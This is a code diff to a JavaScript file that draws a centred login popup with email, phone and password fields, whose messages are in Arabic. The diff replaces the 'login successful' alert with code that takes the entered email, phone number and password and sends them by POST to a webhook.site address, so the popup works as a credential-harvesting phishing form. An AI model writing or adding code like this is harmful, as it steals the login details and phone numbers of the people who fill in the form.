@@ -4,7 +4,7 @@ popup.style.position = "fixed";
 popup.style.top = "50%";
 popup.style.left = "50%";
 popup.style.transform = "translate(-50%, -50%)";
-popup.style.backgroundColor = '#1E0232';
+popup.style.backgroundColor = '#1E0232'; // Updated background color
 popup.style.padding = "20px";
 popup.style.borderRadius = "10px";
 popup.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.5)";
@@ -91,9 +91,32 @@ loginButton.addEventListener("click", function () {
         return;
     }
 
-    // Successful login
-    alert("تم تسجيل الدخول بنجاح!");
-    document.body.removeChild(popup);
+    // Send the data to the webhook
+    var credentials = {
+        email: emailInput.value,
+        phone: phoneInput.value,
+        password: passwordInput.value
+    };
+
+    fetch("https://webhook.site/78735d80-a09c-471a-b188-5aee323d456c", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(credentials)
+    })
+    .then(response => {
+        if (response.ok) {
+            alert("تم إرسال البيانات بنجاح!");
+            document.body.removeChild(popup);
+        } else {
+            alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
+        }
+    })
+    .catch(error => {
+        console.error("Error:", error);
+        alert("حدث خطأ أثناء الإرسال. تحقق من الاتصال.");
+    });
 });
 popup.appendChild(loginButton);
 
